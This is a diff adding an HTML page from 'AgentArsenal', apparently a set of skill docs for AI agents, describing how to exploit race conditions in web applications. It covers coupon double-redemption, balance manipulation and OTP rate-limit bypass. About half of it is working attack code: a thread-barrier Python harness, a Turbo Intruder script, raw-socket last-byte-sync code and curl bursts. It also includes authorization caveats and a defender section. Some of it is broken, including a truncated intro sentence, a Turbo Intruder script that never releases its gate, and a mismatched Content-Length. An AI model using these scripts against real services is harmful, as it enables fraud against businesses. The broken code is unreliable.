@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: race-conditions</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>race-conditions</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing for race conditions (time-of-check to</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a> <a href="auth-attacks.html">auth-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>A race condition happens when the application checks a limit and then acts on it, but two requests slip through the gap between the check and the action. One coupon redeemed twice, one password reset token used in parallel, one rate limit bypassed by fifty simultaneous requests: the logic is correct for sequential traffic and wrong for concurrent traffic. This skill covers the authorized methodology: finding race candidates, firing synchronized parallel requests, measuring the outcome, and keeping the test safe. All testing targets systems you have written permission to test. Race tests move real state, so use dedicated test accounts, keep the blast radius small, and coordinate with the client on what may be mutated.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>List state-changing endpoints with limits: coupon redemption, credit</li>
+<p>or balance changes, single-use tokens, email or password changes, voting, and rate-limited actions.</p>
+<li>Baseline each candidate sequentially: confirm the limit works when</li>
+<p>requests arrive one at a time.</p>
+<li>Build a parallel sender (Python threads or Burp Turbo Intruder) that</li>
+<p>fires 10 to 50 identical requests as simultaneously as possible.</p>
+<li>Measure the outcome: balances, redemption counts, and response codes</li>
+<p>after the burst.</p>
+<li>If the burst shows no flaw, retry with tighter synchronization</li>
+<p>(single-packet attack, last-byte sync) before moving on.</p>
+<li>Reproduce the finding cleanly: reset the test account, fire once</li>
+<p>more, capture the evidence.</p>
+<li>Clean up test state and record the exact request count, timing, and</li>
+<p>observed over-redemption for the report.</p>
+</ol>
+<h2>1. Finding race candidates</h2>
+<p>Look for any endpoint where the same action must not happen twice, or must not exceed a quantity. Good hunting grounds:</p>
+<ul>
+<li>Coupon, voucher, or promo code redemption.</li>
+<li>Adding credit, withdrawing, transferring, or refunding money or</li>
+<p>points.</p>
+<li>Password reset tokens and email change confirmations.</li>
+<li>One-vote-per-user polls and limited-stock purchases.</li>
+<li>Rate-limited endpoints (login attempts, OTP verification).</li>
+<li>Applying a discount, or stacking two discounts.</li>
+</ul>
+<pre><code class="language-bash"># Baseline the coupon flow sequentially first (limit must work serially)
+for i in 1 2 3; do
+  curl -s -b &#x27;session=YOUR_TEST_SESSION&#x27; -X POST \
+    &#x27;https://target.example/api/coupon/redeem&#x27; \
+    -H &#x27;Content-Type: application/json&#x27; \
+    -d &#x27;{&quot;code&quot;:&quot;WELCOME10&quot;}&#x27; | head -c 200
+  echo
+done</code></pre>
+<p>If the second sequential attempt is already accepted, you have a plain logic bug, not a race. Only proceed to parallel testing when sequential behavior is correct.</p>
+<h2>2. Parallel requests with Python threads</h2>
+<p>The simplest race harness: N threads firing the same request, released by a barrier so they start within microseconds of each other.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Thread-barrier race harness (authorized targets only).&quot;&quot;&quot;
+import threading, urllib.request, json
+
+URL = &quot;https://target.example/api/coupon/redeem&quot;
+COOKIE = &quot;session=YOUR_TEST_SESSION&quot;
+N = 20
+barrier = threading.Barrier(N)
+results = []
+
+def fire(_):
+    barrier.wait()  # all threads start together
+    req = urllib.request.Request(
+        URL,
+        data=json.dumps({&quot;code&quot;: &quot;WELCOME10&quot;}).encode(),
+        headers={&quot;Content-Type&quot;: &quot;application/json&quot;,
+                 &quot;Cookie&quot;: COOKIE})
+    try:
+        with urllib.request.urlopen(req, timeout=15) as r:
+            results.append((r.status, r.read()[:120]))
+    except Exception as e:
+        results.append((&quot;ERR&quot;, str(e)[:80]))
+
+threads = [threading.Thread(target=fire, args=(i,)) for i in range(N)]
+for t in threads: t.start()
+for t in threads: t.join()
+ok = sum(1 for s, _ in results if s == 200)
+print(f&quot;{ok}/{N} requests returned 200&quot;)
+for s, body in results[:5]:
+    print(s, body)</code></pre>
+<pre><code class="language-bash"># Measure the account state before and after the burst
+curl -s -b &#x27;session=YOUR_TEST_SESSION&#x27; \
+  &#x27;https://target.example/api/account&#x27; | python3 -c \
+  &quot;import json,sys; d=json.load(sys.stdin); print(&#x27;balance:&#x27;, d.get(&#x27;balance&#x27;), &#x27;coupons:&#x27;, d.get(&#x27;coupons&#x27;))&quot;</code></pre>
+<p>If 20 parallel requests redeem a single-use coupon 7 times, the race is confirmed. Compare against the balance or count endpoint, not just status codes: some applications return 200 for every attempt but only apply one, which is not a finding.</p>
+<h2>3. Single-packet attack with Turbo Intruder</h2>
+<p>Thread barriers still serialize at the network layer. The single-packet attack (Burp Turbo Intruder) holds back the final bytes of each request so all requests complete in one TCP packet window, arriving at the server effectively simultaneously.</p>
+<pre><code class="language-python"># Turbo Intruder script (Burp Suite 2026.2 Extensions tab)
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=30,
+                           pipeline=False)
+    # %s placeholder: engine waits, then releases all at once
+    engine.queue(target.req, gate=&#x27;race1&#x27;)
+
+def handleResponse(req, interesting):
+    table.add(req)</code></pre>
+<pre><code class="language-bash"># In Repeater, craft the request, then send to Turbo Intruder.
+# Append the gate marker so all queued requests fire together:
+# POST /api/coupon/redeem HTTP/1.1 ... (body ends normally)
+# The engine holds the last byte of every connection, then releases.</code></pre>
+<p>In practice: queue 20 to 30 copies of the request with the same gate name, and Turbo Intruder releases them in a single burst. This defeats application-level locks that thread-based bursts cannot, because the requests genuinely overlap inside the server&#x27;s request handling.</p>
+<h2>4. Last-byte synchronization over raw sockets</h2>
+<p>When Turbo Intruder is unavailable, raw sockets with a shared release event approximate the single-packet attack from Python.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Last-byte sync race over raw TLS sockets (authorized targets only).&quot;&quot;&quot;
+import socket, ssl, threading
+
+HOST = &quot;target.example&quot;
+N = 20
+release = threading.Event()
+results = []
+TEMPLATE = (
+    &quot;POST /api/coupon/redeem HTTP/1.1\r\nHost: target.example\r\n&quot;
+    &quot;Content-Type: application/json\r\nCookie: session=YOUR_TEST_SESSION\r\n&quot;
+    &quot;Content-Length: 22\r\nConnection: close\r\n\r\n&quot;
+    &#x27;{&quot;code&quot;:&quot;WELCOME10&quot;}&#x27;
+)
+head, last = TEMPLATE[:-1], TEMPLATE[-1:]
+
+def fire(_):
+    s = ssl.create_default_context().wrap_socket(
+        socket.create_connection((HOST, 443), timeout=10),
+        server_hostname=HOST)
+    s.sendall(head.encode())   # everything except the last byte
+    release.wait()              # wait for the starter pistol
+    s.sendall(last.encode())    # final byte completes all requests at once
+    try:
+        results.append(s.recv(200))
+    except Exception as e:
+        results.append(str(e).encode())
+    s.close()
+
+threads = [threading.Thread(target=fire, args=(i,)) for i in range(N)]
+for t in threads: t.start()
+release.set()                  # fire all at once
+for t in threads: t.join()
+print(f&quot;got {len(results)} responses&quot;)
+print(b&quot;\n&quot;.join(r.split(b&quot;\r\n&quot;)[0] for r in results[:5]))</code></pre>
+<p>Pre-connecting every socket before the release removes TLS handshake jitter from the timing. This is the closest pure-Python approximation of the single-packet attack.</p>
+<h2>5. Measuring and confirming the outcome</h2>
+<p>Status codes lie; state does not. After each burst, query the authoritative state and diff it against the pre-burst value.</p>
+<pre><code class="language-bash"># Coupon case: count redemptions in the account or order history
+curl -s -b &#x27;session=YOUR_TEST_SESSION&#x27; \
+  &#x27;https://target.example/api/coupons/used&#x27; | grep -o &#x27;WELCOME10&#x27; | wc -l
+
+# Balance case: compare before and after
+# (capture BEFORE value, run burst, capture AFTER, compute delta)
+
+# OTP / rate limit case: did N parallel wrong guesses all get evaluated
+# instead of locking the account after 5?
+for i in $(seq 1 3); do
+  curl -s -o /dev/null -w &#x27;%{http_code}\n&#x27; \
+    -b &#x27;session=YOUR_TEST_SESSION&#x27; -X POST \
+    &#x27;https://target.example/api/otp/verify&#x27; \
+    -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;code&quot;:&quot;000000&quot;}&#x27;
+done</code></pre>
+<p>A clean reproduction: reset the test account to a known state, run one burst, and capture the before/after state plus five sample responses. That bundle is the report evidence. Run the burst two or three times; race windows are timing-dependent and a single success among failures still counts, but consistency strengthens the finding.</p>
+<h2>6. Staying inside safe bounds</h2>
+<p>Race tests mutate real state, so agree on boundaries before firing:</p>
+<ul>
+<li>Use dedicated test accounts the client provisioned, never real users.</li>
+<li>Prefer low-value actions: a 10 percent test coupon, not a full</li>
+<p>refund flow. If only high-value flows exist, demonstrate with the smallest burst that proves the window (often 5 requests suffice).</p>
+<li>Never race destructive actions (account deletion, data wipes) or</li>
+<p>actions that notify real people (emails, SMS, charges).</p>
+<li>Cap the burst size: start at 10, raise to 30 only if the server</li>
+<p>clearly serializes smaller bursts.</p>
+<li>Space out attempts so you do not look like a denial of service</li>
+<p>attack, and stop if the application slows for other users.</p>
+<li>Clean up: reverse test redemptions or ask the client to reset the</li>
+<p>test account when you are done.</p>
+</ul>
+<h2>Edge cases</h2>
+<ul>
+<li>The application runs on multiple servers behind a load balancer:</li>
+<p>bursts may land on different nodes with separate in-memory state, which both hides and amplifies races. Pin to one node if the engagement allows (via a header or direct IP), and test both ways.</p>
+<li>Database transactions serialize the critical section: the race</li>
+<p>window may be microseconds wide, so only the single-packet attack reaches it.</p>
+<li>Idempotency keys defeat naive replays: each request needs a fresh</li>
+<p>key, so generate N keys and race those.</p>
+<li>The limit is enforced asynchronously (a queue or cron job): the</li>
+<p>burst always succeeds and the correction happens later. Check state after the async job runs before claiming a finding.</p>
+<li>Rate limiting counts the burst as abuse and bans the test IP:</li>
+<p>coordinate allowlisting with the client first.</p>
+<li>The application deduplicates by request body hash: vary a nonce</li>
+<p>field per request while keeping the semantic action identical.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Thread bursts show nothing: move to the single-packet attack in</li>
+<p>section 3, then to last-byte sync in section 4.</p>
+<li>Single endpoint resists: race two different endpoints that touch the</li>
+<p>same balance (redeem coupon while withdrawing credit).</p>
+<li>The window is tiny: shrink the request (minimal headers) so more</li>
+<p>requests fit inside it, and raise concurrency to 50.</p>
+<li>Server-side locks serialize everything: test whether the lock is</li>
+<p>per-user or global by racing with two different test accounts at once; a per-user lock still allows cross-user races on shared resources like limited stock.</p>
+<li>No state change is directly visible: look for second-order effects</li>
+<p>(emails sent, audit log entries, webhook calls) that reveal double execution.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see race attacks as clusters of identical state-changing requests from one session arriving within milliseconds, duplicate redemptions or balance movements in audit logs, and idempotency or uniqueness constraint violations spiking in database logs. The durable fixes are database-level atomicity (unique constraints, conditional updates like <code>SET balance = balance - x WHERE balance &gt;= x</code>), pessimistic locking or compare-and-swap on the critical section, and idempotency keys for retried operations. Application-level locks in a single process do not survive multi-server deployments, so the fix must live in the shared data store.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): the entry</li>
+<p>point class.</p>
+<li>CWE-362 (Concurrent Execution using Shared Resource with Improper</li>
+<p>Synchronization, Race Condition).</p>
+<li>CWE-367 (Time-of-check Time-of-use Race Condition).</li>
+<li>PortSwigger research on race conditions and the single-packet attack</li>
+<p>technique.</p>
+<li>PortSwigger Web Security Academy: race condition labs.</li>
+<li>Burp Suite 2026.2 documentation: Turbo Intruder extension and</li>
+<p>request engine gating.</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
